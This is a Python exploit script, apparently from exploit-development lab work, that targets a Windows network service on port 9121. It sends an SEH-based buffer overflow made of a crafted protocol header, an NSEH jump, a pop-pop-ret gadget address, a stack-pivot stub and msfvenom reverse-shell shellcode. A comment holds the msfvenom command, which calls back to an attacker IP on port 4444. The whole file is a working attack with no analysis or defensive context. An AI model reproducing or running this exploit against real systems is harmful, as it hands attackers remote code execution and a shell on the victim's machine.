#!/usr/bin/python
import socket
import sys
from struct import pack
try:
    server = sys.argv[1]
    port = 9121
    size= 1000
	# 0x00, 0x02, 0x0A, 0x0D, 0xF8, 0xFD
	# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.100.105 LPORT=4444 -b "\x00\x02\x0A\x0D\xF8\xFD" -f python -v shellcode
    shellcode = b"\x90" * 10
    shellcode += b""
    shellcode += b"\xba\x8f\xe8\xc9\x44\xd9\xc8\xd9\x74\x24\xf4"
    shellcode += b"\x5e\x2b\xc9\xb1\x52\x31\x56\x12\x83\xc6\x04"
    shellcode += b"\x03\xd9\xe6\x2b\xb1\x19\x1e\x29\x3a\xe1\xdf"
    shellcode += b"\x4e\xb2\x04\xee\x4e\xa0\x4d\x41\x7f\xa2\x03"
    shellcode += b"\x6e\xf4\xe6\xb7\xe5\x78\x2f\xb8\x4e\x36\x09"
    shellcode += b"\xf7\x4f\x6b\x69\x96\xd3\x76\xbe\x78\xed\xb8"
    shellcode += b"\xb3\x79\x2a\xa4\x3e\x2b\xe3\xa2\xed\xdb\x80"
    shellcode += b"\xff\x2d\x50\xda\xee\x35\x85\xab\x11\x17\x18"
    shellcode += b"\xa7\x4b\xb7\x9b\x64\xe0\xfe\x83\x69\xcd\x49"
    shellcode += b"\x38\x59\xb9\x4b\xe8\x93\x42\xe7\xd5\x1b\xb1"
    shellcode += b"\xf9\x12\x9b\x2a\x8c\x6a\xdf\xd7\x97\xa9\x9d"
    shellcode += b"\x03\x1d\x29\x05\xc7\x85\x95\xb7\x04\x53\x5e"
    shellcode += b"\xbb\xe1\x17\x38\xd8\xf4\xf4\x33\xe4\x7d\xfb"
    shellcode += b"\x93\x6c\xc5\xd8\x37\x34\x9d\x41\x6e\x90\x70"
    shellcode += b"\x7d\x70\x7b\x2c\xdb\xfb\x96\x39\x56\xa6\xfe"
    shellcode += b"\x8e\x5b\x58\xff\x98\xec\x2b\xcd\x07\x47\xa3"
    shellcode += b"\x7d\xcf\x41\x34\x81\xfa\x36\xaa\x7c\x05\x47"
    shellcode += b"\xe3\xba\x51\x17\x9b\x6b\xda\xfc\x5b\x93\x0f"
    shellcode += b"\x52\x0b\x3b\xe0\x13\xfb\xfb\x50\xfc\x11\xf4"
    shellcode += b"\x8f\x1c\x1a\xde\xa7\xb7\xe1\x89\x07\xef\x8d"
    shellcode += b"\xe9\xe0\xf2\x4d\xfb\xac\x7b\xab\x91\x5c\x2a"
    shellcode += b"\x64\x0e\xc4\x77\xfe\xaf\x09\xa2\x7b\xef\x82"
    shellcode += b"\x41\x7c\xbe\x62\x2f\x6e\x57\x83\x7a\xcc\xfe"
    shellcode += b"\x9c\x50\x78\x9c\x0f\x3f\x78\xeb\x33\xe8\x2f"
    shellcode += b"\xbc\x82\xe1\xa5\x50\xbc\x5b\xdb\xa8\x58\xa3"
    shellcode += b"\x5f\x77\x99\x2a\x5e\xfa\xa5\x08\x70\xc2\x26"
    shellcode += b"\x15\x24\x9a\x70\xc3\x92\x5c\x2b\xa5\x4c\x37"
    shellcode += b"\x80\x6f\x18\xce\xea\xaf\x5e\xcf\x26\x46\xbe"
    shellcode += b"\x7e\x9f\x1f\xc1\x4f\x77\xa8\xba\xad\xe7\x57"
    shellcode += b"\x11\x76\x17\x12\x3b\xdf\xb0\xfb\xae\x5d\xdd"
    shellcode += b"\xfb\x05\xa1\xd8\x7f\xaf\x5a\x1f\x9f\xda\x5f"
    shellcode += b"\x5b\x27\x37\x12\xf4\xc2\x37\x81\xf5\xc6"
    print(len(shellcode))
    shellcode += b"\x43" * (400 - len(shellcode))

    inputBuffer = b"\x41" * 124
    inputBuffer+= pack("<L", (0x06eb9090)) # (NSEH)
    inputBuffer+= pack("<L", (0x1015a2f0)) # (SEH) 0x1015a2f0 - pop eax; pop ebx; ret
    inputBuffer+= b"\x90" * 2
    inputBuffer+= b"\x66\x81\xc4\x18\x08" # add sp, 0x818
    inputBuffer+= b"\xff\xe4" # jmp esp
    inputBuffer+= b"\x90" * (size - len(inputBuffer) - len(shellcode))
    inputBuffer+= shellcode

    header = b"\x75\x19\xba\xab"
    header += b"\x03\x00\x00\x00"
    header += b"\x00\x40\x00\x00"
    header += pack('<I', len(inputBuffer))
    header += pack('<I', len(inputBuffer))
    header += pack('<I', inputBuffer[-1])
    
    buf = header + inputBuffer
    
    print("Sending evil buffer...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    s.send(buf)
    s.close()

    print("Done!")

except socket.error:
    print("Could not connect!")
